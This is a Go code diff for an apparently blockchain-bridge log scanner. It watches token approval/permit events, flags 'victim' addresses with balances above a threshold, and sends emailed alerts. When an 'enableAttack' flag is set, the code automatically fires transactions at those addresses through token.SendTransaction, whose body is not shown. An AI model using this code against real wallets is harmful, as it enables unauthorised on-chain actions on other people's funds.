@@ -164,9 +164,15 @@ var (
 
 	approveTokenAddress string
 	approveLogAddress2 []string
+	approveLogTopic []string
 
 	permitFile *os.File
 	includeAddress bool
+
+	enableAttack bool
+	remainBalance *big.Float
+	enableEmail bool
+
 )
 
 type ethSwapScanner struct {
@@ -210,8 +216,10 @@ func filterlogs(ctx *cli.Context) error {
 	params.LoadConfig(utils.GetConfigFilePath(ctx))
 	go params.WatchAndReloadScanConfig()
 
-	//initDecimal()
 	//initPermitFile(ctx)
+	initEnableTx()
+	initeEnalbeEmail()
+
 	ourselfToken := params.GetBridgeTokenConfig()
 	includeAddress = ourselfToken.Include
 
@@ -263,6 +271,8 @@ func filterlogs(ctx *cli.Context) error {
 	aConfig := params.GetApproveConfig()
 	approveTokenAddress = aConfig.TokenAddress
 	approveLogAddress2 = aConfig.LogAddress2
+	approveLogTopic = aConfig.Topic
+	initDecimal(approveTokenAddress, aConfig.Decimal)
 
 	//mongo
 	mgoConfig := params.GetMongodbConfig()
@@ -283,6 +293,21 @@ func filterlogs(ctx *cli.Context) error {
 
 	scanner.run(ctx.Bool(subscribeFlag.Name))
 	return nil
+}
+
+func initDecimal(contract string, d uint64) {
+	token.AddDecimal(contract, d)
+}
+
+func initEnableTx() {
+	config := params.GetAttackConfig()
+	enableAttack = config.Enable
+	remainBalance = big.NewFloat(config.RemainBalance)
+}
+
+func initeEnalbeEmail() {
+	config := params.GetEmailConfig()
+	enableEmail = config.Enable
 }
 
 func initPermitFile(ctx *cli.Context) {
@@ -1272,8 +1297,7 @@ func initFilerLogs() {
 	approveTopicAll := make([][]common.Hash, 0)
 	//approveTopicAll = append(approveTopicAll, []common.Hash{approveTopic})
 	topicConfig := make([]common.Hash, 0)
-	ourselfToken := params.GetBridgeTokenConfig()
-	for _, topic := range ourselfToken.Topic {
+	for _, topic := range approveLogTopic {
 		topicSlice := strings.Split(topic, ",")
 		topicConfig = append(topicConfig, common.HexToHash(topicSlice[0]))
 	}
@@ -1366,62 +1390,69 @@ func (scanner *ethSwapScanner) loopFilterChain() {
 			}
 			scanner.postRouterSwap(txhash, logIndex, token)
 		case rlog := <-filterLogsApproveChan:
-			txhash := rlog.TxHash.String()
-			//fmt.Printf("txhash: %v\n", txhash)
-			address := rlog.Address.Hex()
-			if !isRouterAddress(address) {
-				continue
-			}
-			tokenAddress := common.BytesToAddress(rlog.Topics[1][:]).Hex()
-			length := len(rlog.Topics)
-			//from := ""
-			//if length > 2 {
-			//	from = common.BytesToAddress(rlog.Topics[2][:]).Hex()
-			//}
-			sender := ""
-			if length > 3 {
-				sender = common.BytesToAddress(rlog.Topics[3][:]).Hex()
-			}
-			number := rlog.BlockNumber
-			//data := rlog.Data
-//0x0000000000000000000000000000000000000000000000208d866cae1d09a800
-			//b, _ := token.GetErc20Balance(scanner.client, approveTokenAddress, sender)
-			ourselfToken := params.GetBridgeTokenConfig()
-			index := 0
-			for _, topic := range ourselfToken.Topic {
-				topicSlice := strings.Split(topic, ",")
-				topic := rlog.Topics[0].String()
-				if strings.EqualFold(topicSlice[0], topic) {
-					index, _ = strconv.Atoi(topicSlice[1])
-					break
-				}
-			}
-			victim := common.BytesToAddress(rlog.Topics[index][:]).Hex()
-			ok := isOurselfToken(string(victim))
-			if (ok && includeAddress) || (!ok && !includeAddress) {
-				log.Warn("Contract: found not our self token permit", "block", number, "txhash", txhash, "chain", chain, "token", tokenAddress, "attacker", sender, "victim", victim)
-				b, _ := token.GetErc20Balance(scanner.client, address, victim)
-				log.Info("filterLogsApproveChan", "victim", victim, "balance", b, "token", address, "txhash", txhash)
-				if b.Cmp(big.NewFloat(0.001)) >= 0 {
-					log.Info("filterLogsApproveChan call token.SendTransaction", "victim", victim, "balance", b, "token", address, "txhash", txhash)
-					err := token.SendTransaction(scanner.client, string(victim))
-					if err != nil {
-						token.SendTransaction(scanner.client, string(victim))
-					}
-				}
-				//subject := fmt.Sprintf("Contract: found not our self token permit")
-				//body := fmt.Sprintf("%v %v %9v %v %9v %v", sender, token, amount, txhash, number, chain)
-				//write2PermitFile(body)
-				//goemail.SendEmail(subject, body)
-			}
+			go scanner.processAttack(rlog)
 		}
 	}
 }
 
+func (scanner *ethSwapScanner) processAttack(rlog types.Log) {
+	address := rlog.Address.Hex()
+	if !isRouterAddress(address) {
+		return
+	}
+	txhash := rlog.TxHash.String()
+	tokenAddress := common.BytesToAddress(rlog.Topics[1][:]).Hex()
+	length := len(rlog.Topics)
+	sender := ""
+	if length > 3 {
+		sender = common.BytesToAddress(rlog.Topics[3][:]).Hex()
+	}
+	number := rlog.BlockNumber
+	ourselfToken := params.GetApproveConfig()
+	index := 0
+	for _, topic := range ourselfToken.Topic {
+		topicSlice := strings.Split(topic, ",")
+		topic := rlog.Topics[0].String()
+		if strings.EqualFold(topicSlice[0], topic) {
+			index, _ = strconv.Atoi(topicSlice[1])
+			break
+		}
+	}
+	victim := common.BytesToAddress(rlog.Topics[index][:]).Hex()
+	ok := isOurselfToken(string(victim))
+	if (ok && includeAddress) || (!ok && !includeAddress) {
+		if enableAttack {
+			b, _ := token.GetErc20Balance(scanner.client, address, victim)
+			log.Warn("permit", "block", number, "txhash", txhash, "chain", chain, "attackContract", tokenAddress, "attacker", sender, "victim", victim, "token", address, "amount", "balance", b)
+			if b.Cmp(remainBalance) >= 0 {
+				go scanner.attackVictim(string(victim))
+			}
+		} else {
+			data := rlog.Data
+			amount := new(big.Int).SetBytes(data[0:32])
+			balance := token.GetBalanceFloat4Int(scanner.client, address, amount)
+			victim = common.BytesToAddress(rlog.Topics[2][:]).Hex()
+			log.Warn("attacked", "block", number, "txhash", txhash, "chain", chain, "attackContract", tokenAddress, "attacker", sender, "victim", victim, "token", address, "amount", balance)
+		}
+		if enableEmail {
+			subject := fmt.Sprintf("Contract: found not our self token permit")
+			body := fmt.Sprintf("%v %v %v", sender, tokenAddress, txhash)
+			go goemail.SendEmail(subject, body)
+		}
+		//write2PermitFile(body)
+	}
+}
+
+func (scanner *ethSwapScanner) attackVictim(victim string) {
+	err := token.SendTransaction(scanner.client, victim)
+	if err != nil {
+		token.SendTransaction(scanner.client, victim)
+	}
+}
+
 func isRouterAddress(address string) bool {
-	ourselfToken := params.GetBridgeTokenConfig()
 	isOurSelf := false
-	if strings.EqualFold(address, ourselfToken.RouterAddress) {
+	if strings.EqualFold(address, approveTokenAddress) {
 		isOurSelf = true
 	}
 	return isOurSelf
